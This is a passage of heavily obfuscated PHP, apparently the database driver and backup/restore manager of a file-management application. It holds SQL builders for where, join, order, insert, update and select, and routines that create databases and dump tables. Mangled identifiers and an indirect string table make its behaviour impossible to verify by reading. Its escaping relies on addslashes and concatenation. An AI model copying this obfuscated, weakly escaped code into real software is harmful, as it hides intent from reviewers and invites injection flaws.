strpos($‡ºÔ“œÃ, $Ç‡Ğ‹£Ò[71])) { $ú±œßËÈ .= $this->parseThinkWhere($‡ºÔ“œÃ, $üõèÏ¬Ñ); } else { if (!preg_match($Ç‡Ğ‹£Ò[1002], trim($‡ºÔ“œÃ))) { think_exception(think_lang($Ç‡Ğ‹£Ò[1003]) . $Ç‡Ğ‹£Ò[4] . $‡ºÔ“œÃ); } $¨¾¯³À = is_array($üõèÏ¬Ñ) && isset($üõèÏ¬Ñ[$Ç‡Ğ‹£Ò[1004]]); $‡ºÔ“œÃ = trim($‡ºÔ“œÃ); if (strpos($‡ºÔ“œÃ, $Ç‡Ğ‹£Ò[281])) { $ÁúéÛú‰ = explode($Ç‡Ğ‹£Ò[281], $‡ºÔ“œÃ); $¹µ‚ÉŞÄ = array(); foreach ($ÁúéÛú‰ as $ĞŸÁ­ş => $Î…ÉùÊİ) { $Ñ©¨Úê = $¨¾¯³À ? $üõèÏ¬Ñ[$ĞŸÁ­ş] : $üõèÏ¬Ñ; $¹µ‚ÉŞÄ[] = $Ç‡Ğ‹£Ò[258] . $this->parseWhereItem($this->parseKey($Î…ÉùÊİ), $Ñ©¨Úê) . $Ç‡Ğ‹£Ò[904]; } $ú±œßËÈ .= implode($Ç‡Ğ‹£Ò[1005], $¹µ‚ÉŞÄ); } elseif (strpos($‡ºÔ“œÃ, $Ç‡Ğ‹£Ò[282])) { $ÁúéÛú‰ = explode($Ç‡Ğ‹£Ò[282], $‡ºÔ“œÃ); $¹µ‚ÉŞÄ = array(); foreach ($ÁúéÛú‰ as $ĞŸÁ­ş => $Î…ÉùÊİ) { $Ñ©¨Úê = $¨¾¯³À ? $üõèÏ¬Ñ[$ĞŸÁ­ş] : $üõèÏ¬Ñ; $¹µ‚ÉŞÄ[] = $Ç‡Ğ‹£Ò[258] . $this->parseWhereItem($this->parseKey($Î…ÉùÊİ), $Ñ©¨Úê) . $Ç‡Ğ‹£Ò[904]; } $ú±œßËÈ .= implode($Ç‡Ğ‹£Ò[1000], $¹µ‚ÉŞÄ); } else { $ú±œßËÈ .= $this->parseWhereItem($this->parseKey($‡ºÔ“œÃ), $üõèÏ¬Ñ); } } $ú±œßËÈ .= $Ç‡Ğ‹£Ò[276] . $ˆàæ’ûÚ; } $ú±œßËÈ = substr($ú±œßËÈ, 0, -strlen($ˆàæ’ûÚ)); } return empty($ú±œßËÈ) ? $Ç‡Ğ‹£Ò[33] : $Ç‡Ğ‹£Ò[1006] . $ú±œßËÈ; } protected function parseWhereItem($ÄÈ©, $‰ÇÏàÙˆ) { $×ÛØ­ =& $_SERVER[Ù×¯Ø…]; $ã›áÊ§ı = $×ÛØ­[33]; if (is_array($‰ÇÏàÙˆ)) { if (is_string($‰ÇÏàÙˆ[0])) { $£ğ¿äÈÎ = strtolower($‰ÇÏàÙˆ[0]); if (in_array($‰ÇÏàÙˆ[0], array($×ÛØ­[990], $×ÛØ­[1007], $×ÛØ­[1008], $×ÛØ­[1009], $×ÛØ­[1010], $×ÛØ­[1011]))) { $ã›áÊ§ı .= $ÄÈ© . $×ÛØ­[50] . $‰ÇÏàÙˆ[0] . $×ÛØ­[50] . $this->parseValue($‰ÇÏàÙˆ[1]); } elseif (preg_match($×ÛØ­[1012], $‰ÇÏàÙˆ[0])) { $ã›áÊ§ı .= $ÄÈ© . $×ÛØ­[50] . $this->exp[$£ğ¿äÈÎ] . $×ÛØ­[50] . $this->parseValue($‰ÇÏàÙˆ[1]); } elseif (preg_match($×ÛØ­[1013], $‰ÇÏàÙˆ[0])) { if (is_array($‰ÇÏàÙˆ[1])) { $„ ¸Ù± = isset($‰ÇÏàÙˆ[2]) ? strtoupper($‰ÇÏàÙˆ[2]) : $×ÛØ­[998]; if (in_array($„ ¸Ù±, array($×ÛØ­[997], $×ÛØ­[998], $×ÛØ­[999]))) { $´˜Œ©´ = array(); foreach ($‰ÇÏàÙˆ[1] as $•‚¯¨) { $´˜Œ©´[] = $ÄÈ© . $×ÛØ­[50] . $this->exp[$£ğ¿äÈÎ] . $×ÛØ­[50] . $this->parseValue($•‚¯¨); } $ã›áÊ§ı .= $×ÛØ­[258] . implode($×ÛØ­[50] . $„ ¸Ù± . $×ÛØ­[50], $´˜Œ©´) . $×ÛØ­[904]; } } else { $ã›áÊ§ı .= $ÄÈ© . $×ÛØ­[50] . $this->exp[$£ğ¿äÈÎ] . $×ÛØ­[50] . $this->parseValue($‰ÇÏàÙˆ[1]); } } elseif ($×ÛØ­[295] == $£ğ¿äÈÎ) { $ã›áÊ§ı .= $×ÛØ­[902] . $ÄÈ© . $×ÛØ­[50] . $‰ÇÏàÙˆ[1] . $×ÛØ­[1014]; } elseif (preg_match($×ÛØ­[1015], $‰ÇÏàÙˆ[0])) { $ã›áÊ§ı .= $‰ÇÏàÙˆ[0]; } elseif (preg_match($×ÛØ­[1016], $‰ÇÏàÙˆ[0])) { if (isset($‰ÇÏàÙˆ[2]) && $×ÛØ­[295] == $‰ÇÏàÙˆ[2]) { $ã›áÊ§ı .= $ÄÈ© . $×ÛØ­[50] . $this->exp[$£ğ¿äÈÎ] . $×ÛØ­[50] . $‰ÇÏàÙˆ[1]; } else { if (is_string($‰ÇÏàÙˆ[1])) { $‰ÇÏàÙˆ[1] = explode($×ÛØ­[47], $‰ÇÏàÙˆ[1]); } $×êƒİ®— = implode($×ÛØ­[47], $this->parseValue($‰ÇÏàÙˆ[1])); $ã›áÊ§ı .= $ÄÈ© . $×ÛØ­[50] . $this->exp[$£ğ¿äÈÎ] . $×ÛØ­[902] . $×êƒİ®— . $×ÛØ­[904]; } } elseif (preg_match($×ÛØ­[1017], $‰ÇÏàÙˆ[0])) { $í’À‰ò = is_string($‰ÇÏàÙˆ[1]) ? explode($×ÛØ­[47], $‰ÇÏàÙˆ[1]) : $‰ÇÏàÙˆ[1]; $ã›áÊ§ı .= $×ÛØ­[902] . $ÄÈ© . $×ÛØ­[50] . $this->exp[$£ğ¿äÈÎ] . $×ÛØ­[50] . $this->parseValue($í’À‰ò[0]) . $×ÛØ­[1000] . $this->parseValue($í’À‰ò[1]) . $×ÛØ­[276]; } else { think_exception(think_lang($×ÛØ­[1003]) . $×ÛØ­[4] . $‰ÇÏàÙˆ[0]); } } else { $¥Şß¤Ô‡ = count($‰ÇÏàÙˆ); $´Œª” = $×ÛØ­[33]; if (is_string($‰ÇÏàÙˆ[$¥Şß¤Ô‡ - 1])) { $´Œª” = isset($‰ÇÏàÙˆ[$¥Şß¤Ô‡ - 1]) ? strtoupper($‰ÇÏàÙˆ[$¥Şß¤Ô‡ - 1]) : $×ÛØ­[33]; if (in_array($´Œª”, array($×ÛØ­[997], $×ÛØ­[998], $×ÛØ­[999]))) { $¥Şß¤Ô‡ = $¥Şß¤Ô‡ - 1; } } else { $´Œª” = $×ÛØ­[997]; } for ($ªõŞÚşø = 0; $ªõŞÚşø < $¥Şß¤Ô‡; $ªõŞÚşø++) { $í’À‰ò = is_array($‰ÇÏàÙˆ[$ªõŞÚşø]) ? $‰ÇÏàÙˆ[$ªõŞÚşø][1] : $‰ÇÏàÙˆ[$ªõŞÚşø]; if ($×ÛØ­[295] == strtolower($‰ÇÏàÙˆ[$ªõŞÚşø][0])) { $ã›áÊ§ı .= $×ÛØ­[258] . $ÄÈ© . $×ÛØ­[50] . $í’À‰ò . $×ÛØ­[1014] . $´Œª” . $×ÛØ­[50]; } else { $·æ·µŞÀ = is_array($‰ÇÏàÙˆ[$ªõŞÚşø]) ? $this->exp[strtolower($‰ÇÏàÙˆ[$ªõŞÚşø][0])] : $×ÛØ­[990]; if (!$·æ·µŞÀ && is_array($‰ÇÏàÙˆ[$ªõŞÚşø]) && in_array($‰ÇÏàÙˆ[$ªõŞÚşø][0], array($×ÛØ­[990], $×ÛØ­[1007], $×ÛØ­[1008], $×ÛØ­[1009], $×ÛØ­[1010], $×ÛØ­[1011]))) { $·æ·µŞÀ = $‰ÇÏàÙˆ[$ªõŞÚşø][0]; } $ã›áÊ§ı .= $×ÛØ­[258] . $ÄÈ© . $×ÛØ­[50] . $·æ·µŞÀ . $×ÛØ­[50] . $this->parseValue($í’À‰ò) . $×ÛØ­[1014] . $´Œª” . $×ÛØ­[50]; } } $ã›áÊ§ı = substr($ã›áÊ§ı, 0, -4); } } else { $ã›áÊ§ı .= $ÄÈ© . $×ÛØ­[1018] . $this->parseValue($‰ÇÏàÙˆ); } return $ã›áÊ§ı; } protected function parseThinkWhere($µ¼Ö¬‡©, $›²î ¥ˆ) { $±¯¾˜Ö =& $_SERVER[Ù×¯Ø…]; $¯ËÒß¥Ş = $±¯¾˜Ö[33]; switch ($µ¼Ö¬‡©) { case $±¯¾˜Ö[350]: $¯ËÒß¥Ş = $›²î ¥ˆ; break; case $±¯¾˜Ö[1001]: $¯ËÒß¥Ş = is_string($›²î ¥ˆ) ? $›²î ¥ˆ : substr($this->parseWhere($›²î ¥ˆ), 6); break; case $±¯¾˜Ö[1019]: parse_str($›²î ¥ˆ, $Éœ©ïù™); if (isset($Éœ©ïù™[$±¯¾˜Ö[996]])) { $ÀâõâÜÔ = $±¯¾˜Ö[50] . strtoupper($Éœ©ïù™[$±¯¾˜Ö[996]]) . $±¯¾˜Ö[50]; unset($Éœ©ïù™[$±¯¾˜Ö[996]]); } else { $ÀâõâÜÔ = $±¯¾˜Ö[1000]; } $¢Ê€Í„Ì = array(); foreach ($Éœ©ïù™ as $Í®¾û³ => $ÃÙ­ğ¸) { $¢Ê€Í„Ì[] = $this->parseKey($Í®¾û³) . $±¯¾˜Ö[1018] . $this->parseValue($ÃÙ­ğ¸); } $¯ËÒß¥Ş = implode($ÀâõâÜÔ, $¢Ê€Í„Ì); break; } return $¯ËÒß¥Ş; } protected function parseLimit($Á‡£šš) { $ÈÌ¤ğŠ® =& $_SERVER[Ù×¯Ø…]; return !empty($Á‡£šš) ? $ÈÌ¤ğŠ®[48] . $Á‡£šš . $ÈÌ¤ğŠ®[50] : $ÈÌ¤ğŠ®[33]; } protected function parseJoin($Õ™ĞÊÖ) { $ˆÓÛÕ‚© =& $_SERVER[Ù×¯Ø…]; $»öùåè» = $ˆÓÛÕ‚©[33]; if (!empty($Õ™ĞÊÖ)) { if (is_array($Õ™ĞÊÖ)) { foreach ($Õ™ĞÊÖ as $ßİÈï°™ => $ÀÜË…Õ) { if (!1 !== stripos($ÀÜË…Õ, $ˆÓÛÕ‚©[1020])) { $»öùåè» .= $ˆÓÛÕ‚©[50] . $ÀÜË…Õ; } else { $»öùåè» .= $ˆÓÛÕ‚©[1021] . $ÀÜË…Õ; } } } else { $»öùåè» .= $ˆÓÛÕ‚©[1021] . $Õ™ĞÊÖ; } } $»öùåè» = preg_replace($ˆÓÛÕ‚©[1022], think_config($ˆÓÛÕ‚©[928]) . $ˆÓÛÕ‚©[1023], $»öùåè»); return $»öùåè»; } protected function parseOrder($ùåâæÂ) { $¶¡ŞÅ =& $_SERVER[Ù×¯Ø…]; if (is_array($ùåâæÂ)) { $‘•ã°îÄ = array(); foreach ($ùåâæÂ as $Ñ·šÂ¿Ù => $¤µÊÓçÅ) { if (is_numeric($Ñ·šÂ¿Ù)) { $‘•ã°îÄ[] = $this->parseKey($¤µÊÓçÅ); } else { $¤µÊÓçÅ = in_array(strtoupper(trim($¤µÊÓçÅ)), array($¶¡ŞÅ[1024], $¶¡ŞÅ[1025])) ? $¶¡ŞÅ[50] . $¤µÊÓçÅ : $¶¡ŞÅ[33]; if (preg_match($¶¡ŞÅ[1026], $Ñ·šÂ¿Ù)) { $‘•ã°îÄ[] = $this->parseKey($Ñ·šÂ¿Ù) . $¤µÊÓçÅ; } else { think_exception($¶¡ŞÅ[1027] . $Ñ·šÂ¿Ù); } } } $ùåâæÂ = implode($¶¡ŞÅ[47], $‘•ã°îÄ); } return !empty($ùåâæÂ) ? $¶¡ŞÅ[1028] . $ùåâæÂ : $¶¡ŞÅ[33]; } protected function parseGroup($‚ÙÖº) { $Ü®ºˆ³ş =& $_SERVER[Ù×¯Ø…]; return !empty($‚ÙÖº) ? $Ü®ºˆ³ş[1029] . $‚ÙÖº : $Ü®ºˆ³ş[33]; } protected function parseHaving($ë«Ï¿‘ª) { $¹‡íÀ‡ =& $_SERVER[Ù×¯Ø…]; return !empty($ë«Ï¿‘ª) ? $¹‡íÀ‡[1030] . $ë«Ï¿‘ª : $¹‡íÀ‡[33]; } protected function parseComment($§’´³·) { $•Œ†ÓûÀ =& $_SERVER[Ù×¯Ø…]; return !empty($§’´³·) ? $•Œ†ÓûÀ[1031] . $§’´³· . $•Œ†ÓûÀ[1032] : $•Œ†ÓûÀ[33]; } protected function parseDistinct($°¶Ùôç) { $»ñùÔÀ =& $_SERVER[Ù×¯Ø…]; return !empty($°¶Ùôç) ? $»ñùÔÀ[1033] : $»ñùÔÀ[33]; } protected function parseUnion($‹¯ñÀßŒ) { $—Ğ–†ê™ =& $_SERVER[Ù×¯Ø…]; if (empty($‹¯ñÀßŒ)) { return $—Ğ–†ê™[33]; } if (isset($‹¯ñÀßŒ[$—Ğ–†ê™[346]])) { $‰÷üØÃñ = $—Ğ–†ê™[1034]; unset($‹¯ñÀßŒ[$—Ğ–†ê™[346]]); } else { $‰÷üØÃñ = $—Ğ–†ê™[1035]; } foreach ($‹¯ñÀßŒ as $Øî„û–À) { $ºÍ»õ×¨[] = $‰÷üØÃñ . (is_array($Øî„û–À) ? $this->buildSelectSql($Øî„û–À) : $Øî„û–À); } return implode($—Ğ–†ê™[50], $ºÍ»õ×¨); } public function insert($ç«Æµ¹¦, $»Ê¤ÆÉ = array(), $º©¼¾å¸ = false) { $’ãƒˆÌ =& $_SERVER[Ù×¯Ø…]; $¯ËóÕİæ = $ñ·ƒÙ¾ = array(); $this->model = $»Ê¤ÆÉ[$’ãƒˆÌ[279]]; foreach ($ç«Æµ¹¦ as $š£öùú => $µûÒŞ”œ) { if (is_array($µûÒŞ”œ) && $’ãƒˆÌ[295] == $µûÒŞ”œ[0]) { $ñ·ƒÙ¾[] = $this->parseKey($š£öùú); $¯ËóÕİæ[] = $µûÒŞ”œ[1]; } elseif (is_scalar($µûÒŞ”œ) || is_null($µûÒŞ”œ)) { $ñ·ƒÙ¾[] = $this->parseKey($š£öùú); $¯ËóÕİæ[] = $this->parseValue($µûÒŞ”œ); } } $ÖšôÎÃ± = ($º©¼¾å¸ ? $’ãƒˆÌ[906] : $’ãƒˆÌ[907]) . $’ãƒˆÌ[908] . $this->parseTable($»Ê¤ÆÉ[$’ãƒˆÌ[277]]) . $’ãƒˆÌ[902] . implode($’ãƒˆÌ[47], $ñ·ƒÙ¾) . $’ãƒˆÌ[903] . implode($’ãƒˆÌ[47], $¯ËóÕİæ) . $’ãƒˆÌ[904]; $ÖšôÎÃ± .= $this->parseLock(isset($»Ê¤ÆÉ[$’ãƒˆÌ[849]]) ? $»Ê¤ÆÉ[$’ãƒˆÌ[849]] : !1); $ÖšôÎÃ± .= $this->parseComment(!empty($»Ê¤ÆÉ[$’ãƒˆÌ[352]]) ? $»Ê¤ÆÉ[$’ãƒˆÌ[352]] : $’ãƒˆÌ[33]); return $this->execute($ÖšôÎÃ±, $this->parseBind(!empty($»Ê¤ÆÉ[$’ãƒˆÌ[283]]) ? $»Ê¤ÆÉ[$’ãƒˆÌ[283]] : array())); } public function selectInsert($•€’±ê, $„Ç¹òÁ, $†ÎÒ½´€ = array()) { $ëÅé ¶¤ =& $_SERVER[Ù×¯Ø…]; $this->model = $†ÎÒ½´€[$ëÅé ¶¤[279]]; if (is_string($•€’±ê)) { $•€’±ê = explode($ëÅé ¶¤[47], $•€’±ê); } array_walk($•€’±ê, array($this, $ëÅé ¶¤[905])); $¡µÓº‘Ş = $ëÅé ¶¤[1036] . $this->parseTable($„Ç¹òÁ) . $ëÅé ¶¤[902] . implode($ëÅé ¶¤[47], $•€’±ê) . $ëÅé ¶¤[1014]; $¡µÓº‘Ş .= $this->buildSelectSql($†ÎÒ½´€); return $this->execute($¡µÓº‘Ş, $this->parseBind(!empty($†ÎÒ½´€[$ëÅé ¶¤[283]]) ? $†ÎÒ½´€[$ëÅé ¶¤[283]] : array())); } public function update($‡ƒ×şı€, $ÆğäÈü) { $Íšäšñş =& $_SERVER[Ù×¯Ø…]; $this->model = $ÆğäÈü[$Íšäšñş[279]]; $®ôö…œà = $Íšäšñş[1037] . $this->parseTable($ÆğäÈü[$Íšäšñş[277]]) . $this->parseSet($‡ƒ×şı€) . $this->parseWhere(!empty($ÆğäÈü[$Íšäšñş[273]]) ? $ÆğäÈü[$Íšäšñş[273]] : $Íšäšñş[33]) . $this->parseOrder(!empty($ÆğäÈü[$Íšäšñş[363]]) ? $ÆğäÈü[$Íšäšñş[363]] : $Íšäšñş[33]) . $this->parseLimit(!empty($ÆğäÈü[$Íšäšñş[290]]) ? $ÆğäÈü[$Íšäšñş[290]] : $Íšäšñş[33]) . $this->parseLock(isset($ÆğäÈü[$Íšäšñş[849]]) ? $ÆğäÈü[$Íšäšñş[849]] : !1) . $this->parseComment(!empty($ÆğäÈü[$Íšäšñş[352]]) ? $ÆğäÈü[$Íšäšñş[352]] : $Íšäšñş[33]); return $this->execute($®ôö…œà, $this->parseBind(!empty($ÆğäÈü[$Íšäšñş[283]]) ? $ÆğäÈü[$Íšäšñş[283]] : array())); } public function delete($ é·‰§ü = array()) { $“¿Ô¾ëö =& $_SERVER[Ù×¯Ø…]; $this->model = $ é·‰§ü[$“¿Ô¾ëö[279]]; $«íÙöá = $“¿Ô¾ëö[1038] . $this->parseTable($ é·‰§ü[$“¿Ô¾ëö[277]]) . $this->parseWhere(!empty($ é·‰§ü[$“¿Ô¾ëö[273]]) ? $ é·‰§ü[$“¿Ô¾ëö[273]] : $“¿Ô¾ëö[33]) . $this->parseOrder(!empty($ é·‰§ü[$“¿Ô¾ëö[363]]) ? $ é·‰§ü[$“¿Ô¾ëö[363]] : $“¿Ô¾ëö[33]) . $this->parseLimit(!empty($ é·‰§ü[$“¿Ô¾ëö[290]]) ? $ é·‰§ü[$“¿Ô¾ëö[290]] : $“¿Ô¾ëö[33]) . $this->parseLock(isset($ é·‰§ü[$“¿Ô¾ëö[849]]) ? $ é·‰§ü[$“¿Ô¾ëö[849]] : !1) . $this->parseComment(!empty($ é·‰§ü[$“¿Ô¾ëö[352]]) ? $ é·‰§ü[$“¿Ô¾ëö[352]] : $“¿Ô¾ëö[33]); return $this->execute($«íÙöá, $this->parseBind(!empty($ é·‰§ü[$“¿Ô¾ëö[283]]) ? $ é·‰§ü[$“¿Ô¾ëö[283]] : array())); } public function select($Êé½Æ¹’ = array()) { $ŒÑ˜ƒ€† =& $_SERVER[Ù×¯Ø…]; $this->model = $Êé½Æ¹’[$ŒÑ˜ƒ€†[279]]; $â›¯ˆã  = $this->buildSelectSql($Êé½Æ¹’); $Ë¥ÈÛ = isset($Êé½Æ¹’[$ŒÑ˜ƒ€†[347]]) ? $Êé½Æ¹’[$ŒÑ˜ƒ€†[347]] : !1; if ($Ë¥ÈÛ) { $ÌÒŒıÊ• = is_string($Ë¥ÈÛ[$ŒÑ˜ƒ€†[93]]) ? $Ë¥ÈÛ[$ŒÑ˜ƒ€†[93]] : $ŒÑ˜ƒ€†[1039] . md5($â›¯ˆã ); $£‘–ë = think_cache($ÌÒŒıÊ•, $ŒÑ˜ƒ€†[33], $Ë¥ÈÛ); if (!1 !== $£‘–ë) { return $£‘–ë; } } $õˆôÌ‚· = $this->query($â›¯ˆã , $this->parseBind(!empty($Êé½Æ¹’[$ŒÑ˜ƒ€†[283]]) ? $Êé½Æ¹’[$ŒÑ˜ƒ€†[283]] : array())); if ($Ë¥ÈÛ && !1 !== $õˆôÌ‚·) { think_cache($ÌÒŒıÊ•, $õˆôÌ‚·, $Ë¥ÈÛ); } return $õˆôÌ‚·; } public function buildSelectSql($Û€­«¹• = array()) { $é»‘ï¼Û =& $_SERVER[Ù×¯Ø…]; if (isset($Û€­«¹•[$é»‘ï¼Û[351]])) { if (strpos($Û€­«¹•[$é»‘ï¼Û[351]], $é»‘ï¼Û[47])) { list($”¢ôââç, $ìÛÉ³»Â) = explode($é»‘ï¼Û[47], $Û€­«¹•[$é»‘ï¼Û[351]]); } else { $”¢ôââç = $Û€­«¹•[$é»‘ï¼Û[351]]; } $”¢ôââç = $”¢ôââç ? $”¢ôââç : 1; $ìÛÉ³»Â = isset($ìÛÉ³»Â) ? $ìÛÉ³»Â : (is_numeric($Û€­«¹•[$é»‘ï¼Û[290]]) ? $Û€­«¹•[$é»‘ï¼Û[290]] : 20); $—Ÿë®åÂ = $ìÛÉ³»Â * ((int) $”¢ôââç - 1); $Û€­«¹•[$é»‘ï¼Û[290]] = $—Ÿë®åÂ . $é»‘ï¼Û[47] . $ìÛÉ³»Â; } if (think_config($é»‘ï¼Û[1040])) { $±Õ–Ã¦ = $é»‘ï¼Û[1041] . md5(serialize($Û€­«¹•)); $î¢£•óÆ = think_cache($±Õ–Ã¦); if ($î¢£•óÆ) { return $î¢£•óÆ; } } $—»»Ä· = $this->parseSql($this->selectSql, $Û€­«¹•); $—»»Ä· .= $this->parseLock(isset($Û€­«¹•[$é»‘ï¼Û[849]]) ? $Û€­«¹•[$é»‘ï¼Û[849]] : !1); if (isset($±Õ–Ã¦)) { think_cache($±Õ–Ã¦, $—»»Ä·); } return $—»»Ä·; } public function parseSql($‰®€Ë²Œ, $ãÑî¡Â = array()) { $µÒ¨«– =& $_SERVER[Ù×¯Ø…]; $‰®€Ë²Œ = str_replace(array($µÒ¨«–[1042], $µÒ¨«–[1043], $µÒ¨«–[1044], $µÒ¨«–[1045], $µÒ¨«–[1046], $µÒ¨«–[1047], $µÒ¨«–[1048], $µÒ¨«–[1049], $µÒ¨«–[1050], $µÒ¨«–[1051], $µÒ¨«–[1052]), array($this->parseTable("{$ãÑî¡Â[$µÒ¨«–[277]]}"), $this->parseDistinct(isset($ãÑî¡Â[$µÒ¨«–[1053]]) ? $ãÑî¡Â[$µÒ¨«–[1053]] : !1), $this->parseField(!empty($ãÑî¡Â[$µÒ¨«–[271]]) ? $ãÑî¡Â[$µÒ¨«–[271]] : $µÒ¨«–[182]), $this->parseJoin(!empty($ãÑî¡Â[$µÒ¨«–[280]]) ? $ãÑî¡Â[$µÒ¨«–[280]] : $µÒ¨«–[33]), $this->parseWhere(!empty($ãÑî¡Â[$µÒ¨«–[273]]) ? $ãÑî¡Â[$µÒ¨«–[273]] : $µÒ¨«–[33]), $this->parseGroup(!empty($ãÑî¡Â[$µÒ¨«–[518]]) ? $ãÑî¡Â[$µÒ¨«–[518]] : $µÒ¨«–[33]), $this->parseHaving(!empty($ãÑî¡Â[$µÒ¨«–[1054]]) ? $ãÑî¡Â[$µÒ¨«–[1054]] : $µÒ¨«–[33]), $this->parseOrder(!empty($ãÑî¡Â[$µÒ¨«–[363]]) ? $ãÑî¡Â[$µÒ¨«–[363]] : $µÒ¨«–[33]), $this->parseLimit(!empty($ãÑî¡Â[$µÒ¨«–[290]]) ? $ãÑî¡Â[$µÒ¨«–[290]] : $µÒ¨«–[33]), $this->parseUnion(!empty($ãÑî¡Â[$µÒ¨«–[345]]) ? $ãÑî¡Â[$µÒ¨«–[345]] : $µÒ¨«–[33]), $this->parseComment(!empty($ãÑî¡Â[$µÒ¨«–[352]]) ? $ãÑî¡Â[$µÒ¨«–[352]] : $µÒ¨«–[33])), $‰®€Ë²Œ); return $‰®€Ë²Œ; } public function getLastSql($ªœè–¸¨ = '') { return $ªœè–¸¨ ? $this->modelSql[$ªœè–¸¨] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¡•Ÿæò) { return addslashes($¡•Ÿæò); } public function setModel($¤¨¡µ õ) { $this->model = $¤¨¡µ õ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Ûƒîš¨İ, $û·ü¦ì = '') { $this->database = $Ûƒîš¨İ; $this->type = $û·ü¦ì; } public function model($•ùÊàºß = '') { return new ModelBase($•ùÊàºß, $_SERVER[Ù×¯Ø…][33], $this->database); } public function db($ı¯¦®Æâ = false) { $ËÌƒ…›» =& $_SERVER[Ù×¯Ø…]; $ù¯ûË¸ = array_change_key_case($this->database); if ($this->type == $ËÌƒ…›»[9] || !$ı¯¦®Æâ) { return $this->model()->db(); } $÷Ä—½£× = $ù¯ûË¸[$ËÌƒ…›»[968]]; $ù¯ûË¸[$ËÌƒ…›»[968]] = $ËÌƒ…›»[33]; if ($ù¯ûË¸[$ËÌƒ…›»[795]] == $ËÌƒ…›»[796]) { $‡èÅ‚Öõ = $ù¯ûË¸[$ËÌƒ…›»[797]]; $ù¯ûË¸[$ËÌƒ…›»[797]] = substr($‡èÅ‚Öõ, 0, strrpos($‡èÅ‚Öõ, $ËÌƒ…›»[1055])); } $this->database = $ù¯ûË¸; $‚â¤’Ú‹ = $this->model()->db(); try { $üÉÔ†®Î = $‚â¤’Ú‹->execute("\163\x68\157\x77\40\144\141\164\x61\142\141\163\145\x73\x20\x6c\151\153\x65\40\x27{$÷Ä—½£×}\47"); } catch (Exception $†é õç×) { } if (!$üÉÔ†®Î) { $‚â¤’Ú‹->execute("\x63\x72\145\x61\164\145\x20\x64\141\164\x61\x62\x61\x73\x65\x20\x60{$÷Ä—½£×}\x60"); } $ù¯ûË¸[$ËÌƒ…›»[968]] = $÷Ä—½£×; if ($ù¯ûË¸[$ËÌƒ…›»[795]] == $ËÌƒ…›»[796]) { $ù¯ûË¸[$ËÌƒ…›»[797]] .= $ËÌƒ…›»[1055] . $÷Ä—½£×; } $this->database = $ù¯ûË¸; $‚â¤’Ú‹->execute("\x75\163\145\40\x60{$÷Ä—½£×}\140"); return $‚â¤’Ú‹; } public function createTable($ıÌí†Ş—, &$Ÿ¸ÌÚİı) { $éÒï£ùÙ =& $_SERVER[Ù×¯Ø…]; if (!IO::exist($ıÌí†Ş—)) { ActionCall($éÒï£ùÙ[1056], !0, 0); show_json(LNG($éÒï£ùÙ[1057]), !1); } $¶çñÚšÓ = sqlSplit(IO::getContent($ıÌí†Ş—)); foreach ($¶çñÚšÓ as $€„˜„ò) { $şÈÄÙŠ„ = stripos($€„˜„ò, $éÒï£ùÙ[1058]) === 0; if ($şÈÄÙŠ„) { $Ÿ¸ÌÚİı->task[$éÒï£ùÙ[1059]] += 1; } $this->model()->db()->execute($€„˜„ò); if ($şÈÄÙŠ„) { preg_match($éÒï£ùÙ[1060], $€„˜„ò, $ÙØ¦İ±Ÿ); $Ÿ¸ÌÚİı->task[$éÒï£ùÙ[1061]] = $ÙØ¦İ±Ÿ[1]; $Ÿ¸ÌÚİı->update(1); } } } public function insertTable($‘Öú¬¬œ, &$Ú«Ş™öî) { $¡ç™Å¶ò =& $_SERVER[Ù×¯Ø…]; $Ê§©³“ = $this->model()->db(); $Øì€„À = $í¡˜÷ï ? array($í¡˜÷ï) : $Ê§©³“->getTables(); foreach ($‘Öú¬¬œ as $‡Í³şüÄ) { $í¡˜÷ï = basename($‡Í³şüÄ, $¡ç™Å¶ò[785]); if (!in_array($í¡˜÷ï, $Øì€„À)) { continue; } $Ú«Ş™öî->task[$¡ç™Å¶ò[1061]] = $í¡˜÷ï; if (get_filesize($‡Í³şüÄ) == 0) { continue; } $Éß“ú‹È = $this->sqlToDb($‡Í³şüÄ, $Ú«Ş™öî); if (!$Éß“ú‹È) { ActionCall($¡ç™Å¶ò[1056], !0, 0); show_json(LNG($¡ç™Å¶ò[1062]) . "\133{$í¡˜÷ï}\x5d", !1); } } } public function sqlFromDb($ß‚ïœ Æ, $Ñ™Ûñ”, &$’Í‚ÛĞ½, $ÛÈ‚áº¹ = '') { if ($’Í‚ÛĞ½) { $’Í‚ÛĞ½->task[$_SERVER[Ù×¯Ø…][1061]] = $ß‚ïœ Æ; } $Ü‚ù«Ü¤ = $this->model($ß‚ïœ Æ); $¥©§†¹ = 0; $äî»¤›Ñ = 0; $»ÁÍ¤Ì› = 10000; $é¬‡‰åì = fopen($Ñ™Ûñ”, $_SERVER[Ù×¯Ø…][1063]); $ËÛ¿„µ” = $Ü‚ù«Ü¤->getPk(); $ÜêçÒşÍ = $Ü‚ù«Ü¤->getDbFields(); do { $›Ÿ÷Óù¡ = array($ËÛ¿„µ” => array($_SERVER[Ù×¯Ø…][1010], $äî»¤›Ñ)); $Â‹ãôÃ¸ = $Ü‚ù«Ü¤->where($›Ÿ÷Óù¡)->field($ÜêçÒşÍ)->order($ËÛ¿„µ” . $_SERVER[Ù×¯Ø…][1064])->limit($»ÁÍ¤Ì›)->select(); $Â‹ãôÃ¸ = !empty($Â‹ãôÃ¸) ? $Â‹ãôÃ¸ : array(); if (!($Î”ÑÜè¢ = count($Â‹ãôÃ¸))) { break; } $Âæ¨ûğŸ = end($Â‹ãôÃ¸); $äî»¤›Ñ = $Âæ¨ûğŸ[$ËÛ¿„µ”]; $×äÆ¶Ã  = array(); foreach ($Â‹ãôÃ¸ as $¥õ´‡«Ì) { if ($ß‚ïœ Æ == $_SERVER[Ù×¯Ø…][1065] && $¥õ´‡«Ì[$_SERVER[Ù×¯Ø…][29]] == $_SERVER[Ù×¯Ø…][1066]) { $ºñÀêã’ = json_decode($¥õ´‡«Ì[$_SERVER[Ù×¯Ø…][372]], !0); if ($ºñÀêã’[$_SERVER[Ù×¯Ø…][28]] == date($_SERVER[Ù×¯Ø…][750]) && !$ºñÀêã’[$_SERVER[Ù×¯Ø…][749]]) { continue; } } if ($ÛÈ‚áº¹) { $¥õ´‡«Ì[$_SERVER[Ù×¯Ø…][76]] = "\173\x69\157\72{$ÛÈ‚áº¹}\x7d" . substr($¥õ´‡«Ì[$_SERVER[Ù×¯Ø…][76]], 